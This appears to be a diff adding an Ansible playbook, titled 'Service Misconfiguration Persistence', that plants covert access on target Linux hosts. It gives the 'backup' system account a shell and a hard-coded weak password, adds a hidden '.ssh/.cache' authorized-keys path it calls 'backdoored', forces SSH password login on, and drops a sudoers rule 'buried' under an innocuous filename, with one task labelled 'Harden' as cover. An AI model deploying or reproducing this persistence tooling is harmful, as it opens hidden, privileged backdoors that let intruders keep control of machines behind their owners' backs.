@@ -1,0 +1,84 @@
+# playbooks/service_misconfig.yml
+---
+- name: Service Misconfiguration Persistence
+  hosts: targets
+  become: yes
+  gather_facts: yes
+
+  vars:
+    ssh_backdoor_user: "backup"
+    ssh_backdoor_pass: "backup123"
+
+  tasks:
+
+    # --- MAKE BACKUP USER LOGIN-CAPABLE ---
+
+    - name: Give backup user a shell
+      user:
+        name: "{{ ssh_backdoor_user }}"
+        shell: /bin/bash
+        password: "{{ ssh_backdoor_pass | password_hash('sha512') }}"
+
+    - name: Ensure backup user has a home directory
+      file:
+        path: /home/{{ ssh_backdoor_user }}
+        state: directory
+        owner: "{{ ssh_backdoor_user }}"
+        group: "{{ ssh_backdoor_user }}"
+        mode: '0750'
+
+    # --- SSH MISCONFIGURATION ---
+
+    - name: Remove any existing AuthorizedKeysFile line
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: '^#?AuthorizedKeysFile'
+        state: absent
+
+    - name: Add backdoored AuthorizedKeysFile line
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        line: 'AuthorizedKeysFile .ssh/authorized_keys .ssh/.cache'
+        state: present
+
+    - name: Ensure password authentication is enabled
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: '^#?PasswordAuthentication'
+        line: 'PasswordAuthentication yes'
+        state: present
+
+    - name: Fix override file that blocks password auth
+      lineinfile:
+        path: /etc/ssh/sshd_config.d/50-cloud-init.conf
+        regexp: '^#?PasswordAuthentication'
+        line: 'PasswordAuthentication yes'
+        state: present
+      ignore_errors: yes    # file may not exist on all machines
+
+    - name: Harden other sshd_config options
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: "{{ item.regexp }}"
+        line: "{{ item.line }}"
+        state: present
+      loop:
+        - { regexp: '^#?PermitRootLogin', line: 'PermitRootLogin prohibit-password' }
+        - { regexp: '^#?DebianBanner', line: 'DebianBanner no' }
+        - { regexp: '^#?MaxAuthTries', line: 'MaxAuthTries 6' }
+
+    - name: Restart SSH to apply config
+      service:
+        name: ssh
+        state: restarted
+
+    # --- SUDOERS MISCONFIGURATION ---
+
+    - name: Drop a sudoers rule buried in sudoers.d
+      copy:
+        src: files/99-sys-defaults
+        dest: /etc/sudoers.d/99-sys-defaults
+        mode: '0440'
+        owner: root
+        group: root
+        validate: /usr/sbin/visudo -cf %s
